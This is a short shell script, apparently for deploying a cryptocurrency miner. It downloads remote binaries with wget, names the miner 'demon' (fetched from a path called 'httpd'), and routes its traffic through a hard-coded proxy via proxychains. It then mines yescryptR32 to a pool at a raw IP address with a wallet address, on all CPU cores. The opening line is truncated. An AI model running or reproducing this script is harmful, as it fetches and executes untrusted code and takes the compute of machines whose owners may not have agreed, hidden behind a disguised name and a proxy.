roxy="157.107.67.214" 
port="40001"
wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./demon -a yescryptR32 -o 45.115.224.46:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-bian) -t $(nproc --all)
